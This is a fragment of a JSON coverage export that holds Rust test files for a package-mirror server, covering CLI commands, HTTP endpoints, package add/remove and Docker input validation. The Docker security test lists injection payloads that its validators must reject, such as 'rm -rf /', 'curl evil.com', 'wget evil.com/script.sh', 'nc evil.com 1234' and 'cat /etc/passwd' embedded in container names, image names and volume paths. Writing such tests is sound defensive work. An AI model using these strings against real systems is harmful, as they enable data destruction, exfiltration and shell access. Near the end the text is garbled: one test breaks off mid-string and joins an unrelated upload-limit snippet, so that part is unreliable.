"traces":[],"covered":0,"coverable":0},{"path":["/","app","rust","vm-package-server","tests","cli_commands_e2e_test.rs"],"content":"//! End-to-end tests for CLI commands\n//!\n//! This module tests the CLI commands by spawning the actual binary and verifying\n//! that the commands work correctly in realistic scenarios. These tests ensure\n//! that the command-line interface functions properly and integrates correctly\n//! with the server components.\n\nuse anyhow::Result;\nuse std::fs;\nuse tempfile::TempDir;\n\nmod common;\nuse common::{\n    assertions, create_test_package_json, execute_cli_command, find_available_port,\n    kill_server_with_output, start_test_server,\n};\n\n/// Tests the start command functionality end-to-end\n#[tokio::test]\nasync fn test_cli_start_command() -\u003e Result\u003c()\u003e {\n    let temp_dir = TempDir::new()?;\n    let data_dir = temp_dir.path().join(\"test_data\");\n    let port = find_available_port()?;\n\n    // Test start command with --no-config and --foreground flags\n    let (child, server_started) = start_test_server(port, \u0026data_dir, \u0026[]).await?;\n\n    // Clean up server process\n    kill_server_with_output(child)?;\n\n    // Only assert if server started (compilation/runtime issues may prevent it)\n    if server_started {\n        // Verify data directories were created\n        assertions::assert_package_directories_exist(\u0026data_dir);\n    } else {\n        // Skip test if server couldn't start (likely due to environment issues)\n        eprintln!(\"Skipping test - server failed to start (likely environment issue)\");\n    }\n\n    Ok(())\n}\n\n/// Tests the add command functionality\n#[tokio::test]\nasync fn test_cli_add_command() -\u003e Result\u003c()\u003e {\n    let temp_dir = TempDir::new()?;\n    let port = find_available_port()?;\n    let data_dir = temp_dir.path().join(\"data\");\n\n    // Start server in background\n    let (server, server_started) = start_test_server(port, \u0026data_dir, \u0026[]).await?;\n\n    if server_started {\n        // Create a temporary package directory with package.json\n        let package_dir = temp_dir.path().join(\"test_package\");\n        fs::create_dir_all(\u0026package_dir)?;\n\n        create_test_package_json(\u0026package_dir, \"test-package\", \"1.0.0\")?;\n\n        // Test add command\n        let output = execute_cli_command(\n            \u0026[\n                \"add\",\n                \"--server\",\n                \u0026format!(\"http://localhost:{}\", port),\n                \"--type\",\n                \"npm\",\n            ],\n            Some(\u0026package_dir),\n        )?;\n\n        // Command should complete (may fail due to missing npm setup, but should execute)\n        println!(\n            \"Add command stderr: {}\",\n            String::from_utf8_lossy(\u0026output.stderr)\n        );\n    }\n\n    // Kill server\n    kill_server_with_output(server)?;\n\n    Ok(())\n}\n\n/// Tests the remove command functionality\n#[tokio::test]\nasync fn test_cli_remove_command() -\u003e Result\u003c()\u003e {\n    let temp_dir = TempDir::new()?;\n    let port = find_available_port()?;\n    let data_dir = temp_dir.path().join(\"data\");\n\n    // Start server in background\n    let (server, server_started) = start_test_server(port, \u0026data_dir, \u0026[]).await?;\n\n    if server_started {\n        // Test remove command with force flag\n        let output = execute_cli_command(\n            \u0026[\n                \"remove\",\n                \"--server\",\n                \u0026format!(\"http://localhost:{}\", port),\n                \"--force\",\n            ],\n            None,\n        )?;\n\n        // Command should complete successfully\n        assertions::assert_command_success(\u0026output, \"Remove\");\n    }\n\n    // Kill server\n    kill_server_with_output(server)?;\n\n    Ok(())\n}\n\n/// Tests the list command functionality\n#[tokio::test]\nasync fn test_cli_list_command() -\u003e Result\u003c()\u003e {\n    let temp_dir = TempDir::new()?;\n    let port = find_available_port()?;\n    let data_dir = temp_dir.path().join(\"data\");\n\n    // Start server in background\n    let (server, server_started) = start_test_server(port, \u0026data_dir, \u0026[]).await?;\n\n    if server_started {\n        // Test list command\n        let output = execute_cli_command(\n            \u0026[\"list\", \"--server\", \u0026format!(\"http://localhost:{}\", port)],\n            None,\n        )?;\n\n        // Command should succeed\n        assertions::assert_command_success(\u0026output, \"List\");\n\n        // Should contain package listing output\n        let stdout = String::from_utf8_lossy(\u0026output.stdout);\n        assert!(\n            stdout.contains(\"packages\") || stdout.contains(\"No packages\"),\n            \"Output should contain package information\"\n        );\n    }\n\n    // Kill server\n    kill_server_with_output(server)?;\n\n    Ok(())\n}\n\n/// Tests the status command functionality\n#[tokio::test]\nasync fn test_cli_status_command() -\u003e Result\u003c()\u003e {\n    let temp_dir = TempDir::new()?;\n    let port = find_available_port()?;\n    let data_dir = temp_dir.path().join(\"data\");\n\n    // Start server in background\n    let (server, server_started) = start_test_server(port, \u0026data_dir, \u0026[]).await?;\n\n    if server_started {\n        // Test status command\n        let output = execute_cli_command(\n            \u0026[\"status\", \"--server\", \u0026format!(\"http://localhost:{}\", port)],\n            None,\n        )?;\n\n        // Command should succeed\n        assertions::assert_command_success(\u0026output, \"Status\");\n\n        // Should contain status information\n        let stdout = String::from_utf8_lossy(\u0026output.stdout);\n        assert!(\n            stdout.contains(\"Server\") || stdout.contains(\"running\") || stdout.contains(\"status\"),\n            \"Output should contain server status information\"\n        );\n    }\n\n    // Kill server\n    kill_server_with_output(server)?;\n\n    Ok(())\n}\n\n/// Tests the start command with Docker flag\n#[tokio::test]\nasync fn test_cli_start_command_with_docker() -\u003e Result\u003c()\u003e {\n    let temp_dir = TempDir::new()?;\n    let data_dir = temp_dir.path().join(\"test_data\");\n    let port = find_available_port()?;\n\n    // Test start command with --docker flag (should fail gracefully if Docker not available)\n    let output = execute_cli_command(\n        \u0026[\n            \"start\",\n            \"--port\",\n            \u0026port.to_string(),\n            \"--data\",\n            data_dir.to_str().unwrap(),\n            \"--docker\",\n        ],\n        None,\n    )?;\n\n    // Command should either succeed (if Docker available) or fail with helpful message\n    if !output.status.success() {\n        let stderr = String::from_utf8_lossy(\u0026output.stderr);\n        assert!(\n            stderr.contains(\"Docker\") || stderr.contains(\"docker\"),\n            \"Error should mention Docker when Docker flag is used\"\n        );\n    }\n\n    Ok(())\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","app","rust","vm-package-server","tests","common","mod.rs"],"content":"//! Common test utilities and helpers\n//!\n//! This module provides shared functionality for all test files to reduce code duplication\n//! and improve maintainability of the test suite.\n\n#![allow(dead_code)]\n\nuse anyhow::Result;\nuse std::fs;\nuse std::net::TcpListener;\nuse std::path::Path;\nuse std::process::{Command, Stdio};\nuse std::sync::Arc;\nuse std::time::Duration;\nuse tempfile::TempDir;\nuse tokio::time::timeout;\nuse vm_package_server::config::Config;\nuse vm_package_server::{upstream::UpstreamConfig, AppState, UpstreamClient};\n\n/// Test server configuration\npub struct TestServerConfig {\n    pub port: u16,\n    pub data_dir: std::path::PathBuf,\n}\n\n/// Test server setup result\npub struct TestSetup {\n    pub temp_dir: TempDir,\n    pub app_state: Arc\u003cAppState\u003e,\n    pub config: TestServerConfig,\n}\n\n/// Creates a test server setup with temporary directories and app state\n///\n/// This function handles the common setup required for most integration tests:\n/// - Creates temporary directories for each package ecosystem\n/// - Sets up upstream client configuration\n/// - Returns app state that can be used for testing\npub async fn create_test_setup() -\u003e Result\u003cTestSetup\u003e {\n    let temp_dir = TempDir::new()?;\n    let data_dir = temp_dir.path().to_path_buf();\n\n    // Create required directories for all package ecosystems\n    create_package_directories(\u0026data_dir)?;\n\n    let upstream_config = UpstreamConfig {\n        enabled: false,\n        ..Default::default()\n    };\n    let upstream_client = Arc::new(UpstreamClient::new(upstream_config).unwrap());\n    let config = Arc::new(Config::default());\n\n    let app_state = Arc::new(AppState {\n        data_dir: data_dir.clone(),\n        server_addr: \"http://localhost:8080\".to_string(),\n        upstream_client,\n        config,\n    });\n\n    // Find available port for testing\n    let port = find_available_port()?;\n\n    let config = TestServerConfig { port, data_dir };\n\n    Ok(TestSetup {\n        temp_dir,\n        app_state,\n        config,\n    })\n}\n\n/// Creates all required package ecosystem directories\npub fn create_package_directories(data_dir: \u0026Path) -\u003e Result\u003c()\u003e {\n    // PyPI directories\n    fs::create_dir_all(data_dir.join(\"pypi/packages\"))?;\n\n    // NPM directories\n    fs::create_dir_all(data_dir.join(\"npm/tarballs\"))?;\n    fs::create_dir_all(data_dir.join(\"npm/metadata\"))?;\n\n    // Cargo directories\n    fs::create_dir_all(data_dir.join(\"cargo/crates\"))?;\n    fs::create_dir_all(data_dir.join(\"cargo/index\"))?;\n\n    Ok(())\n}\n\n/// Finds an available port for testing\npub fn find_available_port() -\u003e Result\u003cu16\u003e {\n    let listener = TcpListener::bind(\"127.0.0.1:0\")?;\n    let port = listener.local_addr()?.port();\n    drop(listener);\n    Ok(port)\n}\n\n/// Starts a test server process and waits for it to be ready\n///\n/// Returns the spawned process and whether the server started successfully.\n/// The caller is responsible for killing the process.\npub async fn start_test_server(\n    port: u16,\n    data_dir: \u0026Path,\n    additional_args: \u0026[\u0026str],\n) -\u003e Result\u003c(std::process::Child, bool)\u003e {\n    let port_str = port.to_string();\n    let data_str = data_dir.to_str().unwrap();\n\n    let mut args = vec![\n        \"run\",\n        \"--bin\",\n        \"pkg-server\",\n        \"--\",\n        \"start\",\n        \"--port\",\n        \u0026port_str,\n        \"--data\",\n        data_str,\n        \"--no-config\",\n        \"--foreground\",\n    ];\n    args.extend(additional_args);\n\n    let child = Command::new(\"cargo\")\n        .args(\u0026args)\n        .stdout(Stdio::piped())\n        .stderr(Stdio::piped())\n        .spawn()?;\n\n    // Wait for server to start with retry logic\n    let server_started = wait_for_server_start(port).await;\n\n    Ok((child, server_started))\n}\n\n/// Waits for a server to start on the given port\npub async fn wait_for_server_start(port: u16) -\u003e bool {\n    const MAX_ATTEMPTS: u32 = 30;\n    const RETRY_DELAY: Duration = Duration::from_millis(500);\n    const REQUEST_TIMEOUT: Duration = Duration::from_secs(3);\n\n    for _ in 0..MAX_ATTEMPTS {\n        tokio::time::sleep(RETRY_DELAY).await;\n\n        let client = reqwest::Client::new();\n        if let Ok(Ok(resp)) = timeout(\n            REQUEST_TIMEOUT,\n            client\n                .get(format!(\"http://localhost:{}/api/status\", port))\n                .send(),\n        )\n        .await\n        {\n            if resp.status().is_success() {\n                return true;\n            }\n        }\n    }\n\n    false\n}\n\n/// Kills a server process and captures its output for debugging\npub fn kill_server_with_output(mut child: std::process::Child) -\u003e Result\u003c()\u003e {\n    child.kill().ok();\n    if let Ok(output) = child.wait_with_output() {\n        if !output.status.success() {\n            eprintln!(\"Server stdout: {}\", String::from_utf8_lossy(\u0026output.stdout));\n            eprintln!(\"Server stderr: {}\", String::from_utf8_lossy(\u0026output.stderr));\n        }\n    }\n    Ok(())\n}\n\n/// Executes a CLI command and returns the output\npub fn execute_cli_command(\n    args: \u0026[\u0026str],\n    current_dir: Option\u003c\u0026Path\u003e,\n) -\u003e Result\u003cstd::process::Output\u003e {\n    let mut cmd = Command::new(\"cargo\");\n    cmd.args([\n        \"run\",\n        \"--features=standalone-binary\",\n        \"--bin\",\n        \"pkg-server\",\n        \"--\",\n    ]);\n    cmd.args(args);\n\n    if let Some(dir) = current_dir {\n        cmd.current_dir(dir);\n    }\n\n    Ok(cmd.output()?)\n}\n\n/// Creates a test package.json file for NPM tests\npub fn create_test_package_json(dir: \u0026Path, name: \u0026str, version: \u0026str) -\u003e Result\u003c()\u003e {\n    let package_json = format!(\n        r#\"{{\n    \"name\": \"{}\",\n    \"version\": \"{}\",\n    \"description\": \"Test package for E2E testing\"\n}}\"#,\n        name, version\n    );\n    fs::write(dir.join(\"package.json\"), package_json)?;\n    Ok(())\n}\n\n/// Common assertion helpers\npub mod assertions {\n    use std::path::Path;\n\n    /// Asserts that all standard package directories exist\n    pub fn assert_package_directories_exist(data_dir: \u0026Path) {\n        assert!(\n            data_dir.join(\"pypi/packages\").exists(),\n            \"PyPI directory should be created\"\n        );\n        assert!(\n            data_dir.join(\"npm/tarballs\").exists(),\n            \"NPM directory should be created\"\n        );\n        assert!(\n            data_dir.join(\"cargo/crates\").exists(),\n            \"Cargo directory should be created\"\n        );\n    }\n\n    /// Asserts that a command completed successfully with helpful error message\n    pub fn assert_command_success(output: \u0026std::process::Output, command_name: \u0026str) {\n        if !output.status.success() {\n            eprintln!(\"{} command failed:\", command_name);\n            eprintln!(\"stdout: {}\", String::from_utf8_lossy(\u0026output.stdout));\n            eprintln!(\"stderr: {}\", String::from_utf8_lossy(\u0026output.stderr));\n        }\n        assert!(\n            output.status.success(),\n            \"{} command should succeed\",\n            command_name\n        );\n    }\n\n    /// Asserts that command output contains expected content\n    pub fn assert_output_contains(output: \u0026std::process::Output, expected: \u0026str, context: \u0026str) {\n        let stdout = String::from_utf8_lossy(\u0026output.stdout);\n        assert!(\n            stdout.contains(expected),\n            \"{} output should contain '{}', got: {}\",\n            context,\n            expected,\n            stdout\n        );\n    }\n}\n\n/// Test data management utilities\npub mod test_data {\n    use anyhow::Result;\n    use std::fs;\n    use std::path::Path;\n\n    /// Creates a minimal Cargo.toml file for testing\n    pub fn create_test_cargo_toml(dir: \u0026Path, name: \u0026str, version: \u0026str) -\u003e Result\u003c()\u003e {\n        let cargo_toml = format!(\n            r#\"[package]\nname = \"{}\"\nversion = \"{}\"\nedition = \"2021\"\n\n[dependencies]\n\"#,\n            name, version\n        );\n        fs::write(dir.join(\"Cargo.toml\"), cargo_toml)?;\n\n        // Create src/lib.rs\n        fs::create_dir_all(dir.join(\"src\"))?;\n        fs::write(dir.join(\"src/lib.rs\"), \"// Test library\\n\")?;\n\n        Ok(())\n    }\n\n    /// Creates a minimal setup.py file for testing\n    pub fn create_test_setup_py(dir: \u0026Path, name: \u0026str, version: \u0026str) -\u003e Result\u003c()\u003e {\n        let setup_py = format!(\n            r#\"from setuptools import setup\n\nsetup(\n    name=\"{}\",\n    version=\"{}\",\n    description=\"Test package\",\n    py_modules=[\"{}\"],\n)\n\"#,\n            name, version, name\n        );\n        fs::write(dir.join(\"setup.py\"), setup_py)?;\n\n        // Create a simple Python module\n        fs::write(dir.join(format!(\"{}.py\", name)), \"# Test module\\n\")?;\n\n        Ok(())\n    }\n\n    /// Cleanup utility for removing generated files\n    pub fn cleanup_build_artifacts(dir: \u0026Path) -\u003e Result\u003c()\u003e {\n        // Remove common build artifacts\n        let artifacts = [\"target\", \"dist\", \"build\", \"*.egg-info\"];\n\n        for artifact in artifacts {\n            let path = dir.join(artifact);\n            if path.exists() {\n                if path.is_dir() {\n                    fs::remove_dir_all(\u0026path)?;\n                } else {\n                    fs::remove_file(\u0026path)?;\n                }\n            }\n        }\n\n        // Remove .tgz files from NPM pack\n        for entry in fs::read_dir(dir)? {\n            let entry = entry?;\n            if let Some(ext) = entry.path().extension() {\n                if ext == \"tgz\" {\n                    fs::remove_file(entry.path())?;\n                }\n            }\n        }\n\n        Ok(())\n    }\n}\n\n/// Compatibility layer for axum-test version issues\npub mod compat {\n    use axum::Router;\n    use std::sync::Arc;\n    use vm_package_server::AppState;\n\n    /// Creates a compatible test service from a router\n    ///\n    /// This function handles the axum version compatibility issues\n    /// by converting the router to an IntoMakeService which is compatible with axum-test\n    pub fn make_test_service(router: Router\u003cArc\u003cAppState\u003e\u003e) -\u003e Router\u003cArc\u003cAppState\u003e\u003e {\n        router\n    }\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","app","rust","vm-package-server","tests","docker_security_test.rs"],"content":"//! Docker Security Tests\n//!\n//! This module verifies the security improvements for Docker command handling.\n//! Tests ensure that Docker command injection vulnerabilities have been\n//! properly mitigated through validation and input sanitization.\n\n/// Docker Security Test - Demonstrates the security improvements\n///\n/// This test file shows how the Docker command injection vulnerabilities\n/// have been fixed with proper validation and escaping.\nuse vm_package_server::validation::{\n    sanitize_docker_name, validate_docker_image_name, validate_docker_port,\n    validate_docker_volume_path, ValidationError,\n};\n\n#[cfg(test)]\nmod docker_security_tests {\n    use super::*;\n\n    #[test]\n    fn test_container_name_injection_blocked() {\n        // Malicious container names that could enable injection attacks\n        let malicious_names = [\n            \"container; rm -rf /\",\n            \"container \u0026\u0026 curl evil.com\",\n            \"container`whoami`\",\n            \"container$(id)\",\n            \"container|cat /etc/passwd\",\n            \"container\\nrm -rf /\",\n            \"container\\0evil\",\n        ];\n\n        for name in malicious_names {\n            println!(\"Testing malicious container name: {}\", name);\n            assert!(\n                sanitize_docker_name(name).is_err(),\n                \"Container name '{}' should be rejected but was allowed\",\n                name\n            );\n        }\n    }\n\n    #[test]\n    fn test_port_injection_blocked() {\n        // Port 0 is invalid for Docker\n        assert!(validate_docker_port(0).is_err());\n\n        // Valid ports should pass\n        assert!(validate_docker_port(80).is_ok());\n        assert!(validate_docker_port(8080).is_ok());\n        assert!(validate_docker_port(65535).is_ok());\n    }\n\n    #[test]\n    fn test_image_name_injection_blocked() {\n        let malicious_images = [\n            \"image; rm -rf /\",\n            \"image \u0026\u0026 wget evil.com/script.sh\",\n            \"image`whoami`\",\n            \"image$(curl evil.com)\",\n            \"image|nc evil.com 1234\",\n            \"image with spaces\",\n            \"image\\necho 'hacked'\",\n            \"image'with'quotes\",\n            \"image\\\"with\\\"doublequotes\",\n        ];\n\n        for image in malicious_images {\n            println!(\"Testing malicious image name: {}\", image);\n            assert!(\n                validate_docker_image_name(image).is_err(),\n                \"Image name '{}' should be rejected but was allowed\",\n                image\n            );\n        }\n\n        // Valid image names should pass\n        assert!(validate_docker_image_name(\"nginx\").is_ok());\n        assert!(validate_docker_image_name(\"nginx:latest\").is_ok());\n        assert!(validate_docker_image_name(\"registry.com/namespace/image:tag\").is_ok());\n    }\n\n    #[test]\n    fn test_volume_path_injection_blocked() {\n        let malicious_paths = [\n            \"/path; rm -rf /\",\n            \"/path \u0026\u0026 cat /etc/passwd\",\n            \"/path`whoami`\",\n            \"/path$(id)\",\n            \"/path|nc evil.com 1234\",\n            \"/path with$variables\",\n            \"/path/with;semicolon\",\n            \"/path/with\u0026ampersand\",\n            \"/path/with|pipe\",\n            \"/path/with`backtick\",\n            \"/path/with(parentheses)\",\n            \"/path/with{braces}\",\n            \"/path/with[brackets]\",\n        ];\n\n        for path in malicious_paths {\n            println!(\"Testing malicious volume path: {}\", path);\n            assert!(\n                validate_docker_volume_path(path).is_err(),\n                \"Volume path '{}' should be rejected but was allowed\",\n                path\n            );\n        }\n\n        // Relative paths should be rejected\n        assert!(validate_docker_volume_path(\"relative/path\").is_err());\n        assert!(validate_docker_volume_path(\"./relative/path\").is_err());\n        assert!(validate_docker_volume_path(\"../parent/path\").is_err());\n\n        // Valid absolute paths should pass\n        assert!(validate_docker_volume_path(\"/home/user/data\").is_ok());\n        assert!(validate_docker_volume_path(\"/var/lib/app\").is_ok());\n    }\n\n    #[test]\n    fn test_validation_error_types() {\n        // Test that specific validation errors are returned\n        match sanitize_docker_name(\"\") {\n            Err(ValidationError::TooShort { actual, min }) =\u003e {\n                assert_eq!(actual, 0);\n                assert_eq!(min, 1);\n            }\n            _ =\u003e panic!(\"Expected TooShort error for empty container name\"),\n        }\n\n        match validate_docker_port(0) {\n            Err(ValidationError::InvalidFormat { reason }) =\u003e {\n                assert!(reason.contains(\"Port 0 is not valid\"));\n            }\n            _ =\u003e panic!(\"Expected InvalidFormat error for port 0\"),\n        }\n\n        match validate_docker_volume_path(\"relative/path\") {\n            Err(ValidationError::InvalidFormat { reason }) =\u003e {\n                assert!(reason.contains(\"must be absolute\"));\n            }\n            _ =\u003e panic!(\"Expected InvalidFormat error for relative path\"),\n        }\n    }\n\n    #[test]\n    fn test_valid_docker_parameters_pass() {\n        // Test that legitimate Docker parameters are not blocked\n        assert!(sanitize_docker_name(\"goobits-pkg-server-8080\").is_ok());\n        assert!(sanitize_docker_name(\"my-app-container\").is_ok());\n        assert!(sanitize_docker_name(\"app123\").is_ok());\n\n        assert!(validate_docker_port(80).is_ok());\n        assert!(validate_docker_port(443).is_ok());\n        assert!(validate_docker_port(8080).is_ok());\n\n        assert!(validate_docker_image_name(\"goobits-pkg-server:latest\").is_ok());\n        assert!(validate_docker_image_name(\"alpine:3.18\").is_ok());\n        assert!(validate_docker_image_name(\"registry.example.com/org/repo:v1.0.0\").is_ok());\n\n        assert!(validate_docker_volume_path(\"/home/appuser/data\").is_ok());\n        assert!(validate_docker_volume_path(\"/var/lib/docker/volumes/data\").is_ok());\n    }\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","app","rust","vm-package-server","tests","integration_test.rs"],"content":"//! Integration tests for HTTP API endpoints\n//!\n//! This module provides integration tests for the HTTP API endpoints\n//! using axum-test to verify correct behavior and response formats.\n//! These tests focus on API functionality without external dependencies.\n\nuse axum::Router;\nuse axum_test::TestServer;\nuse serde_json::json;\nuse std::sync::Arc;\n\nmod common;\nuse common::create_test_setup;\nuse vm_package_server::AppState;\n\n/// Helper to create a test server with temporary directories\nasync fn create_test_server() -\u003e (TestServer, common::TestSetup) {\n    let setup = create_test_setup()\n        .await\n        .expect(\"Failed to create test setup\");\n\n    // Build minimal router for testing\n    let app = Router::new()\n        .route(\"/api/status\", axum::routing::get(server_status))\n        .route(\"/api/packages\", axum::routing::get(list_packages))\n        .with_state(setup.app_state.clone());\n\n    let server = TestServer::new(app).expect(\"Failed to create test server\");\n\n    (server, setup)\n}\n\nasync fn server_status(\n    axum::extract::State(state): axum::extract::State\u003cArc\u003cAppState\u003e\u003e,\n) -\u003e axum::Json\u003cserde_json::Value\u003e {\n    axum::Json(json!({\n        \"status\": \"running\",\n        \"server_addr\": state.server_addr,\n        \"data_dir\": state.data_dir.display().to_string(),\n        \"version\": env!(\"CARGO_PKG_VERSION\")\n    }))\n}\n\nasync fn list_packages(\n    axum::extract::State(_state): axum::extract::State\u003cArc\u003cAppState\u003e\u003e,\n) -\u003e axum::Json\u003cserde_json::Value\u003e {\n    axum::Json(json!({\n        \"pypi\": [],\n        \"npm\": [],\n        \"cargo\": []\n    }))\n}\n\n/// Tests the server status API endpoint\n#[tokio::test]\nasync fn test_api_server_status() {\n    let (server, _setup) = create_test_server().await;\n\n    let response = server.get(\"/api/status\").await;\n    response.assert_status_ok();\n\n    let body: serde_json::Value = response.json();\n    assert_eq!(body[\"status\"], \"running\");\n    assert!(body[\"server_addr\"].is_string());\n    assert!(body[\"data_dir\"].is_string());\n    assert_eq!(body[\"version\"], env!(\"CARGO_PKG_VERSION\"));\n}\n\n/// Tests the package listing API endpoint\n#[tokio::test]\nasync fn test_api_list_packages() {\n    let (server, _setup) = create_test_server().await;\n\n    let response = server.get(\"/api/packages\").await;\n    response.assert_status_ok();\n\n    let body: serde_json::Value = response.json();\n    assert!(body[\"pypi\"].is_array());\n    assert!(body[\"npm\"].is_array());\n    assert!(body[\"cargo\"].is_array());\n}\n\n/// Tests that invalid endpoints return 404\n#[tokio::test]\nasync fn test_api_invalid_endpoint_returns_404() {\n    let (server, _setup) = create_test_server().await;\n\n    let response = server.get(\"/api/nonexistent\").await;\n    response.assert_status_not_found();\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","app","rust","vm-package-server","tests","package_add_remove_test.rs"],"content":"//! Package lifecycle tests\n//!\n//! This module tests the complete lifecycle of package management including\n//! adding, storing, and removing packages across different ecosystems\n//! (Cargo, NPM, PyPI). These tests simulate real package operations.\n\nuse anyhow::Result;\nuse axum::Router;\nuse axum_test::TestServer;\nuse std::fs;\nuse std::path::Path;\nuse std::process::Command;\n\nmod common;\nuse common::create_test_setup;\n\n/// Check if Python 3 and setuptools are available on the system\nfn is_python_available() -\u003e bool {\n    // Check if python3 binary exists\n    let python_exists = Command::new(\"python3\")\n        .arg(\"--version\")\n        .output()\n        .map(|output| output.status.success())\n        .unwrap_or(false);\n\n    if !python_exists {\n        return false;\n    }\n\n    // Check if setuptools is installed\n    Command::new(\"python3\")\n        .args([\"-c\", \"import setuptools\"])\n        .output()\n        .map(|output| output.status.success())\n        .unwrap_or(false)\n}\n\n/// Check if NPM is available on the system\nfn is_npm_available() -\u003e bool {\n    Command::new(\"npm\")\n        .arg(\"--version\")\n        .output()\n        .map(|output| output.status.success())\n        .unwrap_or(false)\n}\n\nasync fn create_test_server() -\u003e (TestServer, common::TestSetup) {\n    let setup = create_test_setup()\n        .await\n        .expect(\"Failed to create test setup\");\n\n    // Create minimal router for testing file operations\n    let app = Router::new().with_state(setup.app_state.clone());\n    let server = TestServer::new(app).expect(\"Failed to create test server\");\n\n    (server, setup)\n}\n\n/// Tests NPM package add and remove lifecycle\n#[tokio::test]\nasync fn test_npm_package_lifecycle() -\u003e Result\u003c()\u003e {\n    // Skip test if NPM is not available\n    if !is_npm_available() {\n        eprintln!(\"Skipping NPM test: npm not found. Install Node.js/npm to run NPM tests.\");\n        return Ok(());\n    }\n\n    let (_server, setup) = create_test_server().await;\n    let state = setup.app_state;\n\n    // Test NPM package upload simulation\n    let fixture_path = \"tests/__fixtures__/npm/hello-world\";\n    assert!(Path::new(fixture_path).exists(), \"NPM fixture should exist\");\n\n    // Create tarball\n    let output = Command::new(\"npm\")\n        .args([\"pack\"])\n        .current_dir(fixture_path)\n        .output()?;\n\n    assert!(output.status.success(), \"NPM pack should succeed\");\n\n    // Find the generated tarball\n    let tarball_files: Vec\u003c_\u003e = fs::read_dir(fixture_path)?\n        .filter_map(|entry| entry.ok())\n        .filter(|entry| entry.path().extension() == Some(\"tgz\".as_ref()))\n        .collect();\n\n    assert!(!tarball_files.is_empty(), \"Should have generated tarball\");\n    let tarball_file = \u0026tarball_files[0];\n\n    // Simulate package storage\n    let tarball_data = fs::read(tarball_file.path())?;\n    let package_dir = state.data_dir.join(\"npm/hello-world\");\n    fs::create_dir_all(\u0026package_dir)?;\n    let tarball_path = package_dir.join(\"hello-world-1.0.0.tgz\");\n    fs::write(\u0026tarball_path, \u0026tarball_data)?;\n\n    // Create metadata file\n    let metadata_path = state.data_dir.join(\"npm/hello-world.json\");\n    let metadata = serde_json::json!({\n        \"name\": \"hello-world\",\n        \"versions\": {\n            \"1.0.0\": {\n                \"name\": \"hello-world\",\n                \"version\": \"1.0.0\"\n            }\n        }\n    });\n    fs::write(\u0026metadata_path, serde_json::to_string_pretty(\u0026metadata)?)?;\n\n    // Verify package exists\n    assert!(metadata_path.exists(), \"Package metadata should exist\");\n    assert!(tarball_path.exists(), \"Package tarball should exist\");\n\n    // Simulate package removal\n    fs::remove_file(\u0026tarball_path)?;\n    fs::remove_file(\u0026metadata_path)?;\n    fs::remove_dir_all(\u0026package_dir)?;\n\n    // Verify package is removed\n    assert!(!tarball_path.exists(), \"Package tarball should be removed\");\n    assert!(\n        !metadata_path.exists(),\n        \"Package metadata should be removed\"\n    );\n\n    // Clean up tarball\n    fs::remove_file(tarball_file.path())?;\n\n    Ok(())\n}\n\n/// Tests PyPI package add and remove lifecycle\n#[tokio::test]\nasync fn test_pypi_package_lifecycle() -\u003e Result\u003c()\u003e {\n    // Skip test if Python 3 is not available\n    if !is_python_available() {\n        eprintln!(\"Skipping PyPI test: Python 3 not found. Install Python 3 + setuptools to run PyPI tests.\");\n        return Ok(());\n    }\n\n    let (_server, setup) = create_test_server().await;\n    let state = setup.app_state;\n\n    // Test PyPI package upload simulation\n    let fixture_path = \"tests/__fixtures__/pypi/hello-world\";\n    assert!(\n        Path::new(fixture_path).exists(),\n        \"PyPI fixture should exist\"\n    );\n\n    // Build the package\n    let output = Command::new(\"python3\")\n        .args([\"setup.py\", \"sdist\", \"bdist_wheel\"])\n        .current_dir(fixture_path)\n        .output()?;\n\n    if !output.status.success() {\n        eprintln!(\"Python package failed:\");\n        eprintln!(\"stdout: {}\", String::from_utf8_lossy(\u0026output.stdout));\n        eprintln!(\"stderr: {}\", String::from_utf8_lossy(\u0026output.stderr));\n    }\n    assert!(\n        output.status.success(),\n        \"Python package build should succeed\"\n    );\n\n    // Find the generated wheel file\n    let dist_dir = Path::new(fixture_path).join(\"dist\");\n    let wheel_files: Vec\u003c_\u003e = fs::read_dir(\u0026dist_dir)?\n        .filter_map(|entry| entry.ok())\n        .filter(|entry| entry.path().extension() == Some(\"whl\".as_ref()))\n        .collect();\n\n    assert!(!wheel_files.is_empty(), \"Should have generated wheel file\");\n    let wheel_file = \u0026wheel_files[0];\n\n    // Simulate package storage\n    let wheel_data = fs::read(wheel_file.path())?;\n    let package_dir = state.data_dir.join(\"pypi/hello-world\");\n    fs::create_dir_all(\u0026package_dir)?;\n    let wheel_path = package_dir.join(\"hello_world-1.0.0-py3-none-any.whl\");\n    fs::write(\u0026wheel_path, \u0026wheel_data)?;\n\n    // Verify package exists\n    assert!(package_dir.exists(), \"Package directory should exist\");\n    assert!(wheel_path.exists(), \"Package wheel should exist "Upload limit implementation verification:\");\n\n    // Test cases\n    let test_cases = vec![\n        (512, \"512 B\"),\n        (1024, \"1.0 KB\"),\n        (1536, \"1.5 KB\"),\n        (1024 * 1024, \"1.0 MB\"),\n        (100 * 1024 * 1024, \"100.0 MB\"),\n        (1024 * 1024 * 1024, \"1.0 GB\"),\n    ];\n\n    println!(\"\\nSize formatting tests:\");\n    for (bytes, expected) in test_cases {\n        let formatted = format_size(bytes);\n        println!(\n            \"  {} bytes -\u003e {} (expected: {})\",\n            bytes, formatted, expected\n        );\n        assert_eq!(formatted, expected);\n    }\n\n    println!(\"\\nUpload size limit tests:\");\n    let max_size = validation::MAX_UPLOAD_SIZE as usize;\n\n    // Test successful upload\n    let small_upload = (validation::MAX_PACKAGE_FILE_SIZE / 2) as usize; // Half the package limit\n    match check_upload_size(small_upload, max_size) {\n        Ok(()) =\u003e println!(\n            \"  ‚úì {}MB upload accepted (within limits)\",\n            small_upload / (1024 * 1024)\n        ),\n        Err(msg) =\u003e println!(\"  ‚úó Small upload rejected unexpectedly: {}\", msg),\n    }\n\n    // Test rejected upload\n    let large_upload = max_size + 1024; // Slightly over limit\n    match check_upload_size(large_upload, max_size) {\n        Ok(()) =\u003e println!(\"  ‚úó Large upload accepted unexpectedly\"),\n        Err(msg) =\u003e {\n            println!(\"  ‚úì Large upload rejected: {}\", msg);\n        }\n    }\n\n    println!(\"\\nValidation constants verification:\");\n    println!(\n        \"  Max upload size: {}\",\n        format_size(validation::MAX_UPLOAD_SIZE as usize)\n    );\n    println!(\n        \"  Max request body size: {}\",\n        format_size(validation::MAX_REQUEST_BODY_SIZE)\n    );\n    println!(\n        \"  Max package file size: {}\",\n        